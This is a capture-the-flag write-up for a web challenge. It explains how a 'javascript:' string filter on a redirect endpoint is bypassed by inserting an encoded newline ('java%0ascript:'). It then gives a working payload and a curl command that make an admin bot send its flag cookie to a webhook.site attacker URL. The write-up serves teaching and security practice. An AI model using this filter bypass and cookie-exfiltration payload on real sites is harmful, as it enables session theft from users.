## You Are Being Redirected – Daily Aplacahack Writeup

**Category:** Web (Client-Side)  
**Goal:** Exfiltrate the admin’s flag cookie using the redirect functionality.

----------
### Overview

This challenge involves exploiting a client-side open redirect vulnerability in combination with an admin bot that visits user-supplied paths. The objective is to execute JavaScript in the context of the challenge origin and exfiltrate the administrator’s cookie containing the flag.

### Vulnerability

The `/redirect?to=` endpoint attempts to block `javascript:` URLs using a string check such as:

**`to.includes("javascript:")`** 

However, the destination is later parsed using the `URL()` constructor. The browser’s URL parser strips control characters like newline (`\n`, `%0a`) from the scheme.

This allows a bypass:

**`java%0ascript:`** 

-   `.includes("javascript:")` → does not match
    
-   `URL()` normalization → becomes `javascript:`
    

As a result, JavaScript execution is possible.

----------

### Exploit

Submit the following path to the admin bot:
```perl
`redirect?to=java%0ascript:fetch('https://webhook.site/ATTACKER_ID?flag='%2bdocument.cookie)` 
```
PAYLOAD:
```bash
`curl -X POST http://<ADMIN_BOT>/api/report \
  -H "Content-Type: application/json" \
  -d '{"path":"redirect?to=java%0ascript:fetch('\''https://webhook.site/ATTACKER_ID?flag='\''%2bdocument.cookie)"}'` 
```
